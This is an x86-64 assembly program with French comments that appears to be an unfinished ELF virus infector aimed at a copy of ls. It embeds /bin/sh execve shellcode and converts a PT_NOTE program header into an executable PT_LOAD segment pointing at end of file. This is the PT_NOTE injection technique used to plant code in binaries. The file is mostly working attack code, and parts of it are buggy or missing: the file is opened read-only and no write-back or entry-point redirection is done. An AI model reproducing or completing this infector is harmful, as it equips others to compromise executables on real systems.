section .data
	file_path db "/tmp/ls", 0	; j'effectue un test sur mon fichier ls copie dans /tmp
	buffer_size equ 10000		;  taille buffer
	stat_size equ 144		; taille de stat

	;shellcode
	shellcode db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
	shellcode_len equ $ - shellcode
	
	; open msg syscall
	error_open_msg db "Erreur lors de l'ouverture du fichier", 0xA
	error_open_msg_len equ $ - error_open_msg
	ok_open_msg db "Ouverture correcte du fichier", 0xA
	ok_open_msg_len equ $ - ok_open_msg

	; read msg syscall
	error_read_msg db "Erreur lors de la lecture du fichier", 0xA
	error_read_msg_len equ $ - error_read_msg
	ok_read_msg db "Lecture correcte du fichier", 0xA
	ok_read_msg_len equ $ - ok_read_msg

	; elf msg elf check
	error_elf_msg db "Fichier non ELF", 0xA
	error_elf_msg_len equ $ - error_elf_msg
	ok_elf_msg db "Fichier ELF", 0xA
	ok_elf_msg_len equ $ -  ok_elf_msg
	
	; pt_note msg 
	error_pt_note_msg db "Ce n'est pas un PT_NOTE", 0xA
	error_pt_note_msg_len equ $ - error_pt_note_msg 
	ok_pt_note_msg db "C'est un PT_NOTE", 0xA
	ok_pt_note_msg_len equ $ - ok_pt_note_msg

section .bss
	buffer resb buffer_size		; Je reserve un espace memoire pour mon elf
	stat resb stat_size		; Reserve de l'espace pour stat
section .text

global _start

_start:
	;syscall open, pour l'ouverture de notre fichier elf
	mov rax, 2			; syscall open
	lea rdi, [rel file_path]	; path de notre elf
	mov rsi, 0			; O_RDONLY
	syscall
	test rax, rax			; Check si le file est OK (rax==0)
	js _error_open			; Gestion d'erreur pour open
	mov r13, rax			; Si OK alors on met le fd dans r13 en attendant le syscall print
	call _ok_open	
	
	; Lecture du fichier
	; syscall read				
	mov rax, 0			; read(
	mov rdi, r13			; int fd,
	mov rsi, buffer			; void buf*, 	
	mov rdx, buffer_size		; size_t count
	syscall				;)
	;	gestion erreur sys_read
	test rax, rax
	js _error_read
	call _ok_read

	; On va stoquer le buffer dans R15 car quasiment jamais touché
	lea r15, [buffer]
	
	; Check si fichier ELF
	cmp dword  [r15], 0x464C457F
	; 	gestion erreur elf
	jne _error_elf
	call _ok_elf

	; On va jump jusqu'à e_entry qui se trouve dans l'header
	; Normalement il se trouve en r15+0x18 puis on le stock dans r14
	mov r14, [r15+0x18]

	; On va prendre la taille du fichier avec sys_stat
	mov rax, 0x5			; fstat(
	mov rdi, rdi			; int fd,
	mov rsi, stat			; void buf*
	syscall				; ) 

	mov r13, [stat+0x30]		; On met la taille st_size dans r13

	; On peut maintenant parser le programme header phdr
	xor rcx, rcx			; Initialise rcx
	xor rdx, rdx			; Initialise rdx
	mov cx, word [r15+0x38]		; e_phnum
	mov rbx, qword [r15+0x20]	; e_phoff
	mov dx, word [r15+0x36]		; e_phentsize

	; On cherche un PT_NOTE phdr
	call _loop_phdr


	call _exit

_ok_pt_note:
	lea rsi, [rel ok_pt_note_msg]
	mov rdx, ok_pt_note_msg_len
	call _print_msg			; Msg de succès
	mov dword [r15+rbx], 0x1	; on transforme notre p_type en PT_LOAD
	mov dword [r15+rbx+0x4], 0x5	; On accord permission RX à p_flags
	mov qword [r15+rbx+0x8], r13	; On met p_offset à EOF
	add r13, 0xc000000		; On prend un large adresse et on l'ajoute à R13
	mov qword [r15+rbx+0x10], r13	; On met p_vaddr suffisamment loin (grosse adresse) pour que ca n'interfere pas avec le code de base
	mov qword [r15+rbx+0x20], shellcode_len  ; Taille de mon shellcode dans p_filesz
	mov qword [r15+rbx+0x28], shellcode_len  ; Taille de mon shellcode dans p_memsz
	mov qword [r15+rbx+0x30], 0x1000; Alignement des pages	
	call _exit


_loop_phdr:
	add rbx, rdx			; on passe au prochain phdr
	dec rcx				; Decrémente le nombre de phdr
	cmp dword [r15+rbx], 0x4	; On check si PT_NOTE (p_type == 0x4) 
	je _ok_pt_note			; On a trouver un PT_NOTE phdr	
		; Sinon on check si il reste des phdr a comparer
	; 	gestion des erreurs pour le parsing
	lea rsi, [rel error_pt_note_msg]
	mov rdx, error_pt_note_msg_len
	call _print_msg
	xor rdx,rdx
	mov dx, word [r15+0x36]
	cmp rcx, 0
	jg _loop_phdr

_ok_elf:
	lea rsi, [rel ok_elf_msg]
	mov rdx, ok_elf_msg_len
	call _print_msg
	ret
_error_elf:
	lea rsi, [rel error_elf_msg]
	mov rdx, error_elf_msg_len
	call _print_msg
	mov rax, 60
	mov rdi, 1			; code retour pour non elf
	syscall

_ok_read:
	lea rsi,  [rel ok_read_msg]
	mov rdx, ok_read_msg_len
	call _print_msg
	ret

_error_read:
	lea rsi, [rel error_read_msg]
	mov rdx, error_read_msg_len
	call _print_msg
	call _exit	

_ok_open:
	lea rsi, [rel ok_open_msg]
	mov rdx, ok_open_msg_len
	call _print_msg
	ret

_error_open:
	; syscall pour exit + petit message
	lea rsi, [rel error_open_msg]
	mov rdx, error_open_msg_len
	call _print_msg
	call _exit

_print_msg:
	mov rax, 1
	mov rdi, 1
	syscall
	ret

_exit:
	mov rax, 60
	xor rdi, rdi
	syscall
